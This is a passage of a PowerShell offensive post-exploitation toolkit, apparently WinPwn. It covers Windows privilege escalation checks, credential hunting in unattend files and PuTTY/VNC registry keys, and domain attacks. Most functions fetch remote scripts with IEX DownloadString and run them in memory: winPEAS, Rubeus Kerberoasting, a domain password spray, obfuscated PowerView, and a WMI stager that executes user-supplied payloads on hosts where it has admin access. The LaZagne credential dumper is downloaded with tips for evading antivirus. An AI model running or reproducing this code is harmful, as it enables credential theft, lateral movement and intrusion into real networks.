        if (Test-Path $env:SystemDrive\sysprep\sysprep.xml) { Write "$env:SystemDrive\sysprep\sysprep.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattended.xml) { Write "$env:WINDIR\Panther\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Panther\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Panther\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend.xml) { Write "$env:WINDIR\Panther\Unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT) { Write "$env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo) { Write "$env:WINDIR\panther\setupinfo" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo.bak) { Write "$env:WINDIR\panther\setupinfo.bak" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\unattend.xml) { Write "$env:SystemDrive\unattend.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep.inf) { Write "$env:WINDIR\system32\sysprep.inf" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\sysprep.xml) { Write "$env:WINDIR\system32\sysprep\sysprep.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config) { Write "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path $env:SystemDrive\inetpub\wwwroot\web.config) { Write "$env:SystemDrive\inetpub\wwwroot\web.config" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml") { Write "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml" >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path HKLM:\SOFTWARE\RealVNC\WinVNC4) { Get-ChildItem -Path HKLM:\SOFTWARE\RealVNC\WinVNC4 >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if (Test-Path HKCU:\Software\SimonTatham\PuTTY\Sessions) { Get-ChildItem -Path HKCU:\Software\SimonTatham\PuTTY\Sessions >> $currentPath\LocalPrivEsc\Passwordfiles.txt ; $i = 1 }
        if ($i -eq 0) { Write "Files not found."}
        else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
    }
    else
    {
        Write "-------> Files that may contain passwords:"
        $i = 0
        if (Test-Path $env:SystemDrive\sysprep.inf) { Write "$env:SystemDrive\sysprep.inf" ; $i = 1}
        if (Test-Path $env:SystemDrive\sysprep\sysprep.xml) { Write "$env:SystemDrive\sysprep\sysprep.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattended.xml) { Write "$env:WINDIR\Panther\Unattended.xml" ;$i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\Panther\Unattend.xml) { Write "$env:WINDIR\system32\sysprep\Panther\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend\Unattended.xml) { Write "$env:WINDIR\Panther\Unattend\Unattended.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Panther\Unattend.xml) { Write "$env:WINDIR\Panther\Unattend.xml" ; $i = 1 }
        if (Test-Path $env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT) { Write "$env:SystemDrive\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT" ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo) { Write "$env:WINDIR\panther\setupinfo" ; $i = 1 }
        if (Test-Path $env:WINDIR\panther\setupinfo.bak) { Write "$env:WINDIR\panther\setupinfo.bak" ; $i = 1 }
        if (Test-Path $env:SystemDrive\unattend.xml) { Write "$env:SystemDrive\unattend.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep.inf) { Write "$env:WINDIR\system32\sysprep.inf" ; $i = 1 }
        if (Test-Path $env:WINDIR\system32\sysprep\sysprep.xml) { Write "$env:WINDIR\system32\sysprep\sysprep.xml" ; $i = 1 }
        if (Test-Path $env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config) { Write "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" ; $i = 1 }
        if (Test-Path $env:SystemDrive\inetpub\wwwroot\web.config) { Write "$env:SystemDrive\inetpub\wwwroot\web.config" ; $i = 1 }
        if (Test-Path "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml") { Write "$env:AllUsersProfile\Application Data\McAfee\Common Framework\SiteList.xml" ; $i = 1 }
        if (Test-Path HKLM:\SOFTWARE\RealVNC\WinVNC4) { Get-ChildItem -Path HKLM:\SOFTWARE\RealVNC\WinVNC4 ; $i = 1 }
        if (Test-Path HKCU:\Software\SimonTatham\PuTTY\Sessions) { Get-ChildItem -Path HKCU:\Software\SimonTatham\PuTTY\Sessions ; $i = 1 }
        if ($i -eq 0) { Write "Files not found."}
        else {$out = get-content $currentPath\LocalPrivEsc\Passwordfiles.txt; $out }
    }
    If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
    {
        Write-Warning "This script will not function with administrative privileges. Please run as a normal user."
        Break
    }
    Write-Host -ForegroundColor Yellow 'Looking for Writable PATH variable folders:'
    #Credit here https://gist.github.com/wdormann/eb714d1d935bf454eb419a34be266f6f 
    $outfile = "acltestfile"
    set-variable -name paths -value (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path.Split(";")
    Write "-------> Writable PATH Variable folders:"
    Foreach ($path in $paths) 
    {
        Try {
                [io.file]::OpenWrite("$path\$outfile").close()
                Write-Warning "I can write to '$path'"
	            if(!$consoleoutput){echo $path >> $currentPath\LocalPrivEsc\Writable_PATH_Variable_Folder.txt}else{echo $path}
                $insecure = 1
            }
            Catch {}
    }
    If ($insecure -eq 1) {
        Write-Warning "Any directory above is in the system-wide directory list, but can also be written to by the current user."
        Write-Host "This can allow privilege escalation." -ForegroundColor Red
    } Else {
        Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
    }
    if(!$consoleoutput){Reg1c1de >> $currentPath\LocalPrivEsc\WritebleRegistryKeys.txt}
}

function winPEAS
{
    # https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS wrapped in powershell
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f
    if (!$noninteractive){invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1'');Invoke-winPEAS -command '' '';pause}'}
    if ($noninteractive)
    {
        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-winPEAS.ps1')
        if(!$consoleoutput){Invoke-winPEAS -command ' ' >> $currentPath\LocalPrivEsc\winPEAS.txt}else{Invoke-winPEAS -command 'cmd'}
    }
    REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
}

function Reg1c1de
{
	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')
	Invoke-Reg1c1de
}

function Privescmodules
{
<#
        .DESCRIPTION
        All privesc scripts are executed here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    @'
             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
   --> local Privilege Escalation checks
'@
        if($noninteractive -and (!$consoleoutput))
        {
            itm4nprivesc
            winPEAS
            oldchecks
            otherchecks
            return
        }
        elseif($noninteractive -and $consoleoutput)
        {
            itm4nprivesc -noninteractive -consoleoutput
            winPEAS -noninteractive -consoleoutput
            oldchecks -noninteractive -consoleoutput
            otherchecks -noninteractive -consoleoutput
            return
        }

        
        do
        {
            Write-Host "================ WinPwn ================"
            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'
            Write-Host -ForegroundColor Green '2. winPEAS! '
            Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
            Write-Host -ForegroundColor Green '4. All other checks! '
            Write-Host -ForegroundColor Green '5. Go back '
            Write-Host "================ WinPwn ================"
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
            
            Switch ($masterquestion) 
            {
                1{itm4nprivesc}
                2{winPEAS}
                3{oldchecks}
                4{otherchecks}
            }
        }
        While ($masterquestion -ne 5)  

}

function laZagnemodule
{
    <#
        .DESCRIPTION
        Downloads and executes Lazagne from AlessandroZ for Credential gathering / privilege escalation.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Privilege Escalation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
    Write-Host -ForegroundColor Yellow 'Checking, if the file was killed by antivirus:'
    if (Test-Path $currentPath\WinCreds.exe)
    {
        Write-Host -ForegroundColor Yellow 'Not killed, Executing:'
	    if(!$consoleoutput){mkdir $currentPath\Lazagne}
        if(!$consoleoutput){.\WinCreds.exe all >> "$currentPath\Lazagne\Passwords.txt"}else{.\WinCreds.exe all}
        Write-Host -ForegroundColor Yellow 'Results saved to $currentPath\Lazagne\Passwords.txt!'
    }
    else {Write-Host -ForegroundColor Red 'Antivirus got it, try an obfuscated version or In memory execution with Pupy:'}
}

function latmov
{
    <#
        .DESCRIPTION
        Looks for administrative Access on any system in the current network/domain. If Admin Access is available somewhere, Credentials can be dumped remotely / alternatively Powershell_Empire Stager can be executed.
        Brute Force for all Domain Users with specific Passwords (for example Summer2018) can be done here.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    
    
    Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'

    Write-Host -ForegroundColor Yellow 'Searching for Domain Systems we can pwn with admin rights, this can take a while depending on the size of your domain:'

    fuller >> $currentPath\Exploitation\LocalAdminAccess.txt

    $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
    if ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
    {
        launcher
    }
}

function Domainpassspray
{
    <#
        .DESCRIPTION
        Domain password spray, credit to https://github.com/dafthack/.
    #>
    #Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
	[Switch]
        $emptypasswords,
	[Switch]
        $usernameaspassword,
        [String]
        $password   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    
    if ($emptypasswords)
    {
    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')
 	if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPath\Exploitation\EmptyPasswords.txt}
	else
	{
		Invoke-SprayEmptyPassword
	}
    }
    elseif($usernameaspassword)
    {
        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}
        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPath\Exploitation\UsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  
        if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\UsernameAsPasswordCreds.txt"} 
    }
    else
    {    	  	
    	if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
       	if (Test-Path $currentPath\passlist.txt) 
        {
        	Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
        }
        else 
        { 
           if(!$consoleoutput){$onepass = Read-Host -Prompt 'Please enter one Password for DomainSpray manually:'}
           if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  
           if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"}
	}
   }
}

function launcher
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/wmicmd.ps1')
    if (Test-Path $currentPath\Exploitation\LocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        $file = "$currentPath\Exploitation\Exploited.txt"
        While($i -ne "quit") 
        {
	        If ($i -ne $NULL) 
            {
		        $i.Trim() | Out-File $file -append
	        }
	        $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target:'    
        }

    }

    $stagerfile = "$currentPath\Exploitation\Stager.txt"
    While($Payload -ne "quit") 
    {
	    If ($Payload -ne $NULL) 
        {
	        $Payload.Trim() | Out-File $stagerfile -append
	    }
        $Payload = Read-Host -Prompt 'Please provide the code to execute :'
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution? (yes/no):'

    if (Test-Path $currentPath\Exploitation\Exploited.txt)
    {
        $Hosts = Get-Content "$currentPath\Exploitation\Exploited.txt"
    }
    else {$Hosts = Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if ($executionwith -eq "yes" -or $executionwith -eq "y" -or $executionwith -eq "Yes" -or $executionwith -eq "Y")
    {
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts | bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
    }
}

function Shareenumeration
{
    <#
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while:'
    if(!$consoleoutput){Claire >> $currentPath\SensitiveFiles.txt}else{Claire}
    if(!$consoleoutput){shift -qgsNZggitoinaTA >> $currentPath\Networkshares.txt}else{shift -qgsNZggitoinaTA}
}

function groupsearch
{
    <#
        .DESCRIPTION
        AD can be searched for specific User/Group Relations over Group Policies.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    iex ($viewdevobfs)
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
            if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
            {
                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
                $username = Get-Credential
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Credential $username >> $currentPath\Groupsearches.txt
            }
            else
            {
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...:'
                rewires -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
            }
}

function proxydetect
{
    <#
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access / other user input is possible as well.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>    
    #Proxy Detect #1
    
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $env:COMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is: '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights? (yes/no)'
        if ($proxy -eq "yes" -or $proxy -eq "y" -or $proxy -eq "Yes" -or $proxy -eq "Y")
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function Kerberoasting
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    #Exploitation Phase
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    Write-Host -ForegroundColor Red 'Kerberoasting active:'
        
    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .\Exploitation\'
    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
    if(!$consoleoutput){Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt"}else{Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"}
    if(!$consoleoutput){Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"}else{Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"}
	Write-Host -ForegroundColor Yellow 'Using the powershell version as backup: '
}

function inv-phantom {
    if (isadmin)
    {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/phantom.ps1')
        phantom
    }
    else 
    { 
        Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example Privesc :-P'
        Sleep 3;
    }
}

filter ConvertFrom-SDDL
{
<#
.SYNOPSIS
    Author: Matthew Graeber (@mattifestation)
.LINK
    http://www.exploit-monday.com
#>

    Param (
        [Parameter( Position = 0, Mandatory = $True, ValueFromPipeline = $True )]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $RawSDDL
    )

    $RawSDDL = $RawSDDL -replace "`n|`r"
    Set-StrictMode -Version 2

    # Get reference to sealed RawSecurityDescriptor class
    $RawSecurityDescriptor = [Int].Assembly.GetTypes() | ? { $_.FullName -eq 'System.Security.AccessControl.RawSecurityDescriptor' }

    # Create an instance of the RawSecurityDescriptor class based upon the provided raw SDDL
    try
    {
        $Sddl = [Activator]::CreateInstance($RawSecurityDescriptor, [Object[]] @($RawSDDL))
    }
    catch [Management.Automation.MethodInvocationException]
    {
        throw $Error[0]
    }
    if ($Sddl.Group -eq $null)
    {
        $Group = $null
    }
    else
    {
        $SID = $Sddl.Group
        $Group = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    if ($Sddl.Owner -eq $null)
    {
        $Owner = $null
    }
    else
    {
        $SID = $Sddl.Owner
        $Owner = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    $ObjectProperties = @{
        Group = $Group
        Owner = $Owner
    }
    if ($Sddl.DiscretionaryAcl -eq $null)
    {
        $Dacl = $null
    }
    else
    {
        $DaclArray = New-Object PSObject[](0)
        $ValueTable = @{}
        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.CryptoKeyRights])
        $CryptoEnumValues = $EnumValueStrings | % {
                $EnumValue = [Security.AccessControl.CryptoKeyRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValueStrings = [Enum]::GetNames([System.Security.AccessControl.FileSystemRights])
        $FileEnumValues = $EnumValueStrings | % {
                $EnumValue = [Security.AccessControl.FileSystemRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValues = $CryptoEnumValues + $FileEnumValues
        foreach ($DaclEntry in $Sddl.DiscretionaryAcl)
        {
            $SID = $DaclEntry.SecurityIdentifier
            $Account = $SID.Translate([Security.Principal.NTAccount]).Value
            $Values = New-Object String[](0)

            # Resolve access mask
            foreach ($Value in $EnumValues)
            {
                if (($DaclEntry.Accessmask -band $Value) -eq $Value)
                {
                    $Values += $Value.ToString()
                }
            }
            $Access = "$($Values -join ',')"
            $DaclTable = @{
                Rights = $Access
                IdentityReference = $Account
                IsInherited = $DaclEntry.IsInherited
                InheritanceFlags = $DaclEntry.InheritanceFlags
                PropagationFlags = $DaclEntry.PropagationFlags
            }
            if ($DaclEntry.AceType.ToString().Contains('Allowed'))
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Allow
            }
            else
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]::Deny
            }
            $DaclArray += New-Object PSObject -Property $DaclTable
        }
        $Dacl = $DaclArray
    }
    $ObjectProperties['Access'] = $Dacl
    $SecurityDescriptor = New-Object PSObject -Property $ObjectProperties
    Write-Output $SecurityDescriptor
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $env:COMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\',
                            'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,$Computer)
                    $RegistryLocation | ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames() | ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram | ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram | ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey("$CurrentReg$_")).GetValue('InstallLocation') -replace '\\$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat |
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} |
                                                    Sort-Object -Property LastAccessed |
                                                    Select-Object -Last 1 | ForEach-Object {
